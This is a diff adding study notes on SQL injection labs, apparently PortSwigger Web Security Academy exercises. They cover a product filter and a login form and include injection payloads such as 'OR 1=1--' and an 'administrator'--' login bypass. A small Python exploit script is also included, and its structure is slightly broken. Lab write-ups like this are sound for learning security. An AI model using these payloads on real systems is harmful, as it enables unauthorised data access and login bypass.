@@ -1,0 +1,68 @@
+SQL injection can be detected manually by using a systematic set of tests against every entry point in the application.
+
+SQL Injection - Product Category filter
+
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+End goal: display all products both released and unreleased.
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+Enter single quote (') for pets
+SELECT * FROM products WHERE category = ''' AND released = 1 //internal server error - probably vulnerable to SQL Injection
+
+Insert query with quotes
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+LAB 1
+SELECT * FROM products WHERE category = ' 'OR 1=1--' AND released = 1
+
+Python script
+
+
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies =  {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+def exploit_sqli(url, payload):
+    uri ='/filter?category='
+    r = requests.get(url + uri +  payload, verify=False, proxies=proxies)
+    if "Real" in r.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        
+        
+        
+if exploit_sqli(url, payload):
+    print("[+] SQL Injection Successful!")
+else:
+    print("[-] SQL Injection unsuccessful!")
+
+Run in Terminal
+py sqli-lab-01.py https://0a510061038eb0a3c0e25e75001a0081.web-security-academy.net "'OR 1=1--"
+
+
+LAB 2: SQL Injection - Login functionality
+
+End goal: perform SQL injection attack and log in as administrator user.
+
+Analysis
+
+SELECT firstname FROM users where username='admin' and passwords='admin'
+
+SELECT firstname FROM users where username=''' and passwords='admin' //got internal server error
+
+SELECT firstname FROM users where username='admin'--' and passwords='admin'
+administrator'--
